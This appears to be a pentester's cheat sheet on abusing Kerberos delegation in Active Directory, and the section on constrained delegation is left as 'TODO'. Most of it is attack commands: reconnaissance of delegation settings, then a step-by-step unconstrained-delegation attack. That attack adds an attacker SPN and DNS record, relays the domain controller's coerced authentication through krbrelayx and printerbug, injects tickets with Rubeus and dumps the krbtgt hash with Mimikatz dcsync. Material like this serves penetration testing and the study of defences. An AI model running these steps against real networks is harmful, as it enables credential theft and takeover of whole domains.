# Overview
>In theory, Kerberos delegations allow services to access other services on behalf of domain users.
>There are three types of delegations : 
>- **Unconstrained delegations** (KUD): a service can impersonate users on any other service.
>- **Constrained delegations** (KCD): a service can impersonate users on a set of services
>- **Resource based constrained delegations** (RBCD) : a set of services can impersonate users on a service
>Kerberos delegations can be abused by attackers to obtain access to valuable assets and sometimes even escalate to domain admin privileges. Regarding constrained delegations and rbcd, those types of delegation rely on Kerberos extensions called [Service-for-User](https://www.thehacker.recipes/ad/movement/kerberos/#service-for-user-extensions) (S4U).

# Reconnaissance
## Linux
```bash
findDelegation.py "DOMAIN"/"USER":"PASSWORD"
```

## Windows
```powershell
# With PowerView
Get-ADComputer "Account" -Properties TrustedForDelegation, TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount
```

# Exploitation
## Unconstrained 
### Linux
```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Check that the record was added successfully (after ~3 minutes)
nslookup attacker.DOMAIN_FQDN DomainController

# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
# 4.b. or supply the right Kerberos long-term key directly
krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE

# 5. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'

# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.
# There should be a krbtgt ccache file in the current directory. And it can be used by
export KRB5CCNAME=`pwd`/'krbtgt.ccache'
```

### Windows
```powershell
# Extract the TGT
Rubeus.exe monitor /interval:5

# Use the extracted TGT to request a Service Ticket for another service
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt

# The TGT is injected, access service to extract krbtgt hash in Mimikatz
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```

## Constrained
TODO